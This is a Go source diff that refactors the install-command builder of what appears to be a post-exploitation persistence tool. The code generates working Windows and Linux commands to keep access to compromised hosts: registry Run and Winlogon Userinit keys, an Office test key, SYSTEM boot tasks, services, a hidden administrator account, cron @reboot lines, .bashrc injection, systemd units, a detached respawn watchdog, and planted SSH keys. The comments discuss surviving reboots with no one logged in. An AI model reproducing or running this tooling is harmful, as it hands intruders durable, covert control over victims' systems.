@@ -110,181 +110,197 @@ func installCommand(platform, module, payload, name string) ([]string, error) {
 
 	switch platform {
 	case platformWindows:
-		qp, err := shellQuoteWindows(payload)
+		return installCommandWindows(module, payload, name)
+	case platformLinux:
+		return installCommandLinux(module, payload, name)
+	}
+	return nil, fmt.Errorf("unknown platform %q", platform)
+}
+
+// installCommandWindows returns the Windows install argv for module.
+//
+// It is the Windows half of installCommand, split out so the dispatcher stays a
+// dispatcher. The module name still flows through shellQuoteWindows for the
+// payload, exactly as before.
+func installCommandWindows(module, payload, name string) ([]string, error) {
+	platform := platformWindows
+	qp, err := shellQuoteWindows(payload)
+	if err != nil {
+		return nil, err
+	}
+	switch module {
+	case "win-run-key", "win-run-key-hklm":
+		key := runKeyHKCU
+		if module == "win-run-key-hklm" {
+			key = runKeyHKLM
+		}
+		script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`, key, name, qp)
+		return shellArgv(platform, script), nil
+	case "win-startup-folder":
+		target, err := shellQuoteWindows(startupDir + `\` + name + ".exe")
 		if err != nil {
 			return nil, err
 		}
-		switch module {
-		case "win-run-key", "win-run-key-hklm":
-			key := runKeyHKCU
-			if module == "win-run-key-hklm" {
-				key = runKeyHKLM
-			}
-			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`, key, name, qp)
-			return shellArgv(platform, script), nil
-		case "win-startup-folder":
-			target, err := shellQuoteWindows(startupDir + `\` + name + ".exe")
-			if err != nil {
-				return nil, err
-			}
-			script := fmt.Sprintf("copy /y %s %s", qp, target)
-			return shellArgv(platform, script), nil
-		case "win-schtask":
-			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onlogon /f`, name, qp)
-			return shellArgv(platform, script), nil
-		case "win-service":
-			script := fmt.Sprintf(`sc create %s binPath= %s start= auto`, name, qp)
-			return shellArgv(platform, script), nil
-		case "win-local-account":
-			// Payload is the password, not a file. `net user` enforces the local
-			// password policy and reports a rejection as text, which reaches the
-			// operator through the normal result message rather than being lost.
-			//
-			// The group is named literally rather than by SID: `net localgroup`
-			// takes a name, and "Administrators" is not localised on the systems
-			// this runs against. Quoting the name keeps a rich password from
-			// being split by the command interpreter.
-			script := fmt.Sprintf(`net user %s %s /add && net localgroup Administrators %s /add`,
-				name, qp, name)
-			return shellArgv(platform, script), nil
-		case "win-schtask-boot":
-			// /ru SYSTEM with an onstart trigger runs before any interactive
-			// logon, which is the point: access survives a reboot with nobody
-			// present to log in.
-			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onstart /ru SYSTEM /f`, name, qp)
-			return shellArgv(platform, script), nil
-		case "win-watchdog":
-			script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc minute /mo %d /f`, name, qp, watchdogMinutes)
-			return shellArgv(platform, script), nil
-		case "win-logon-script":
-			// The shell reads this value as a program to run, so the payload path
-			// is stored as-is. name is not part of the value -- the key holds a
-			// single script -- but it still names the artifact for the inventory
-			// and for removal, which is why the module is name-scoped.
-			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
-				logonScriptKey, logonScriptValue, qp)
-			return shellArgv(platform, script), nil
-		case "win-office-test":
-			// Office only consults the value if the key itself exists, so the
-			// install creates the key explicitly before writing into it.
-			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
-				officeTestKey, name, qp)
-			return shellArgv(platform, script), nil
-		case "win-winlogon-userinit":
-			// Winlogon requires userinit.exe to remain the first entry in the list;
-			// dropping it makes interactive logon fail and can leave the host
-			// reachable only through the payload.
-			//
-			// The value is rewritten rather than appended in place. Appending would
-			// mean parsing the existing list inside cmd.exe, and the obvious
-			// `%VAR:str=%` substitution breaks on a payload path because the search
-			// string contains a colon. Writing the canonical prefix plus the payload
-			// keeps userinit.exe first, is idempotent (a re-install does not grow the
-			// list), and needs no parsing. The tradeoff is that a host with a custom
-			// Userinit already set would lose it, so the operator is told to check
-			// the current value first with the registry read.
-			// The whole list is quoted as one value. Quoting the payload separately
-			// would place its closing quote before the value's own, producing
-			// `userinit.exe,"a.exe""` -- cmd.exe rejects that and the value is left
-			// unchanged. qp is already known to contain no double quote, so building
-			// the value first and quoting the result is exact.
-			value := winlogonUserinitExe + payload
-			script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`,
-				winlogonKey, winlogonUserinit, value)
-			return shellArgv(platform, script), nil
-		}
-		return nil, fmt.Errorf("unknown persistence module %q", module)
-
-	case platformLinux:
-		qp := shellQuotePOSIX(payload)
-		switch module {
-		case "linux-cron":
-			// crond re-parses the line through /bin/sh, so the path stays quoted.
-			// The whole "@reboot <payload>" string is single-quoted as one unit.
-			//
-			// It used to be `echo "@reboot %s"` with a separately single-quoted
-			// payload inside, which nests two quoting schemes: the payload's own
-			// single quotes were correct, but the surrounding double quotes meant a
-			// double quote in the payload closed the echo argument and the rest of
-			// the line ran as a command. A plausible path such as /tmp/agent"v2 was
-			// a hard "Unterminated quoted string" that left no crontab entry.
-			//
-			// Quoting once, after building the full string, removes the nesting
-			// rather than trying to escape two layers against each other.
-			script := fmt.Sprintf(`(crontab -l 2>/dev/null; echo %s) | crontab -`,
-				shellQuotePOSIX("@reboot "+payload))
-			return shellArgv(platform, script), nil
-		case "linux-bashrc":
-			script := fmt.Sprintf("echo %s >> ~/.bashrc", shellQuotePOSIX("nohup "+payload+" >/dev/null 2>&1 &"))
-			return shellArgv(platform, script), nil
-		case "linux-systemd":
-			unit := []string{
-				"[Unit]",
-				"Description=" + name,
-				"[Service]",
-				"Type=simple",
-				"ExecStart=/bin/sh -c " + qp,
-				"Restart=always",
-				"[Install]",
-				"WantedBy=multi-user.target",
-			}
-			script := fmt.Sprintf("printf '%%s\\n' %s > /etc/systemd/system/%s.service && systemctl enable --now %s",
-				quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
-			return shellArgv(platform, script), nil
-		case "linux-systemd-user":
-			// Same unit, but rooted in the user manager. WantedBy=default.target is
-			// the user manager's equivalent of multi-user.target, and no root is
-			// needed -- which is the whole point on an unprivileged session.
-			unit := []string{
-				"[Unit]",
-				"Description=" + name,
-				"[Service]",
-				"Type=simple",
-				"ExecStart=/bin/sh -c " + qp,
-				"Restart=always",
-				"[Install]",
-				"WantedBy=default.target",
-			}
-			script := fmt.Sprintf(
-				"mkdir -p ~/.config/systemd/user && printf '%%s\\n' %s > ~/.config/systemd/user/%s.service && systemctl --user daemon-reload && systemctl --user enable --now %s",
-				quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
-			return shellArgv(platform, script), nil
-		case "linux-cron-interval":
-			// Re-adds the line unconditionally; a duplicate would run the payload
-			// twice per tick. Removing first makes the install idempotent, which
-			// matters because the operator cannot see the crontab to fix it by hand.
-			script := fmt.Sprintf(
-				`crontab -l 2>/dev/null | grep -v %s | crontab -; (crontab -l 2>/dev/null; echo %s) | crontab -`,
-				shellQuotePOSIX(intervalSchedule+payload),
-				shellQuotePOSIX(intervalSchedule+payload))
-			return shellArgv(platform, script), nil
-		case "linux-watchdog":
-			// A supervisor loop, independent of cron and systemd, for hosts where
-			// neither is usable. `setsid` detaches it from the session so it
-			// outlives the shell that started it; without that the loop dies with
-			// the exec and respawns nothing.
-			dir := watchdogDir(name)
-			loop := fmt.Sprintf(
-				"while :; do pgrep -f %s >/dev/null 2>&1 || setsid nohup %s >/dev/null 2>&1 & sleep %d; done",
-				shellQuotePOSIX(payload), qp, watchdogSeconds)
-			// The launch is backgrounded inside a subshell and then the loop is
-			// counted, so the result says whether a watchdog is really running. A
-			// bare trailing `&` reports success even where setsid is absent,
-			// leaving the operator believing in a supervisor that is not there.
-			// The paths are double-quoted because $HOME still has to expand.
-			script := fmt.Sprintf(
-				"mkdir -p \"%s\" && printf '%%s\\n' %s > \"%s/loop.sh\" && chmod 700 \"%s/loop.sh\" && (setsid /bin/sh \"%s/loop.sh\" >/dev/null 2>&1 &) && sleep 1; pgrep -fc %s || true",
-				dir, shellQuotePOSIX(loop), dir, dir, dir, shellQuotePOSIX(name+"/loop.sh"))
-			return shellArgv(platform, script), nil
-		case "linux-ssh-authorized-keys":
-			script := fmt.Sprintf(
-				"mkdir -p ~/.ssh && chmod 700 ~/.ssh && printf '%%s\\n' %s >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
-				qp)
-			return shellArgv(platform, script), nil
-		}
-		return nil, fmt.Errorf("unknown persistence module %q", module)
+		script := fmt.Sprintf("copy /y %s %s", qp, target)
+		return shellArgv(platform, script), nil
+	case "win-schtask":
+		script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onlogon /f`, name, qp)
+		return shellArgv(platform, script), nil
+	case "win-service":
+		script := fmt.Sprintf(`sc create %s binPath= %s start= auto`, name, qp)
+		return shellArgv(platform, script), nil
+	case "win-local-account":
+		// Payload is the password, not a file. `net user` enforces the local
+		// password policy and reports a rejection as text, which reaches the
+		// operator through the normal result message rather than being lost.
+		//
+		// The group is named literally rather than by SID: `net localgroup`
+		// takes a name, and "Administrators" is not localised on the systems
+		// this runs against. Quoting the name keeps a rich password from
+		// being split by the command interpreter.
+		script := fmt.Sprintf(`net user %s %s /add && net localgroup Administrators %s /add`,
+			name, qp, name)
+		return shellArgv(platform, script), nil
+	case "win-schtask-boot":
+		// /ru SYSTEM with an onstart trigger runs before any interactive
+		// logon, which is the point: access survives a reboot with nobody
+		// present to log in.
+		script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc onstart /ru SYSTEM /f`, name, qp)
+		return shellArgv(platform, script), nil
+	case "win-watchdog":
+		script := fmt.Sprintf(`schtasks /create /tn %s /tr %s /sc minute /mo %d /f`, name, qp, watchdogMinutes)
+		return shellArgv(platform, script), nil
+	case "win-logon-script":
+		// The shell reads this value as a program to run, so the payload path
+		// is stored as-is. name is not part of the value -- the key holds a
+		// single script -- but it still names the artifact for the inventory
+		// and for removal, which is why the module is name-scoped.
+		script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
+			logonScriptKey, logonScriptValue, qp)
+		return shellArgv(platform, script), nil
+	case "win-office-test":
+		// Office only consults the value if the key itself exists, so the
+		// install creates the key explicitly before writing into it.
+		script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d %s /f`,
+			officeTestKey, name, qp)
+		return shellArgv(platform, script), nil
+	case "win-winlogon-userinit":
+		// Winlogon requires userinit.exe to remain the first entry in the list;
+		// dropping it makes interactive logon fail and can leave the host
+		// reachable only through the payload.
+		//
+		// The value is rewritten rather than appended in place. Appending would
+		// mean parsing the existing list inside cmd.exe, and the obvious
+		// `%VAR:str=%` substitution breaks on a payload path because the search
+		// string contains a colon. Writing the canonical prefix plus the payload
+		// keeps userinit.exe first, is idempotent (a re-install does not grow the
+		// list), and needs no parsing. The tradeoff is that a host with a custom
+		// Userinit already set would lose it, so the operator is told to check
+		// the current value first with the registry read.
+		// The whole list is quoted as one value. Quoting the payload separately
+		// would place its closing quote before the value's own, producing
+		// `userinit.exe,"a.exe""` -- cmd.exe rejects that and the value is left
+		// unchanged. qp is already known to contain no double quote, so building
+		// the value first and quoting the result is exact.
+		value := winlogonUserinitExe + payload
+		script := fmt.Sprintf(`reg add "%s" /v %s /t REG_SZ /d "%s" /f`,
+			winlogonKey, winlogonUserinit, value)
+		return shellArgv(platform, script), nil
 	}
-	return nil, fmt.Errorf("unknown platform %q", platform)
+	return nil, fmt.Errorf("unknown persistence module %q", module)
+
+}
+
+// installCommandLinux returns the POSIX install argv for module.
+func installCommandLinux(module, payload, name string) ([]string, error) {
+	platform := platformLinux
+	qp := shellQuotePOSIX(payload)
+	switch module {
+	case "linux-cron":
+		// crond re-parses the line through /bin/sh, so the path stays quoted.
+		// The whole "@reboot <payload>" string is single-quoted as one unit.
+		//
+		// It used to be `echo "@reboot %s"` with a separately single-quoted
+		// payload inside, which nests two quoting schemes: the payload's own
+		// single quotes were correct, but the surrounding double quotes meant a
+		// double quote in the payload closed the echo argument and the rest of
+		// the line ran as a command. A plausible path such as /tmp/agent"v2 was
+		// a hard "Unterminated quoted string" that left no crontab entry.
+		//
+		// Quoting once, after building the full string, removes the nesting
+		// rather than trying to escape two layers against each other.
+		script := fmt.Sprintf(`(crontab -l 2>/dev/null; echo %s) | crontab -`,
+			shellQuotePOSIX("@reboot "+payload))
+		return shellArgv(platform, script), nil
+	case "linux-bashrc":
+		script := fmt.Sprintf("echo %s >> ~/.bashrc", shellQuotePOSIX("nohup "+payload+" >/dev/null 2>&1 &"))
+		return shellArgv(platform, script), nil
+	case "linux-systemd":
+		unit := []string{
+			"[Unit]",
+			"Description=" + name,
+			"[Service]",
+			"Type=simple",
+			"ExecStart=/bin/sh -c " + qp,
+			"Restart=always",
+			"[Install]",
+			"WantedBy=multi-user.target",
+		}
+		script := fmt.Sprintf("printf '%%s\\n' %s > /etc/systemd/system/%s.service && systemctl enable --now %s",
+			quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
+		return shellArgv(platform, script), nil
+	case "linux-systemd-user":
+		// Same unit, but rooted in the user manager. WantedBy=default.target is
+		// the user manager's equivalent of multi-user.target, and no root is
+		// needed -- which is the whole point on an unprivileged session.
+		unit := []string{
+			"[Unit]",
+			"Description=" + name,
+			"[Service]",
+			"Type=simple",
+			"ExecStart=/bin/sh -c " + qp,
+			"Restart=always",
+			"[Install]",
+			"WantedBy=default.target",
+		}
+		script := fmt.Sprintf(
+			"mkdir -p ~/.config/systemd/user && printf '%%s\\n' %s > ~/.config/systemd/user/%s.service && systemctl --user daemon-reload && systemctl --user enable --now %s",
+			quoteEachPOSIX(unit), name, shellQuotePOSIX(name))
+		return shellArgv(platform, script), nil
+	case "linux-cron-interval":
+		// Re-adds the line unconditionally; a duplicate would run the payload
+		// twice per tick. Removing first makes the install idempotent, which
+		// matters because the operator cannot see the crontab to fix it by hand.
+		script := fmt.Sprintf(
+			`crontab -l 2>/dev/null | grep -v %s | crontab -; (crontab -l 2>/dev/null; echo %s) | crontab -`,
+			shellQuotePOSIX(intervalSchedule+payload),
+			shellQuotePOSIX(intervalSchedule+payload))
+		return shellArgv(platform, script), nil
+	case "linux-watchdog":
+		// A supervisor loop, independent of cron and systemd, for hosts where
+		// neither is usable. `setsid` detaches it from the session so it
+		// outlives the shell that started it; without that the loop dies with
+		// the exec and respawns nothing.
+		dir := watchdogDir(name)
+		loop := fmt.Sprintf(
+			"while :; do pgrep -f %s >/dev/null 2>&1 || setsid nohup %s >/dev/null 2>&1 & sleep %d; done",
+			shellQuotePOSIX(payload), qp, watchdogSeconds)
+		// The launch is backgrounded inside a subshell and then the loop is
+		// counted, so the result says whether a watchdog is really running. A
+		// bare trailing `&` reports success even where setsid is absent,
+		// leaving the operator believing in a supervisor that is not there.
+		// The paths are double-quoted because $HOME still has to expand.
+		script := fmt.Sprintf(
+			"mkdir -p \"%s\" && printf '%%s\\n' %s > \"%s/loop.sh\" && chmod 700 \"%s/loop.sh\" && (setsid /bin/sh \"%s/loop.sh\" >/dev/null 2>&1 &) && sleep 1; pgrep -fc %s || true",
+			dir, shellQuotePOSIX(loop), dir, dir, dir, shellQuotePOSIX(name+"/loop.sh"))
+		return shellArgv(platform, script), nil
+	case "linux-ssh-authorized-keys":
+		script := fmt.Sprintf(
+			"mkdir -p ~/.ssh && chmod 700 ~/.ssh && printf '%%s\\n' %s >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
+			qp)
+		return shellArgv(platform, script), nil
+	}
+	return nil, fmt.Errorf("unknown persistence module %q", module)
 }
 
 // removeCommand returns the argv that removes module from platform.
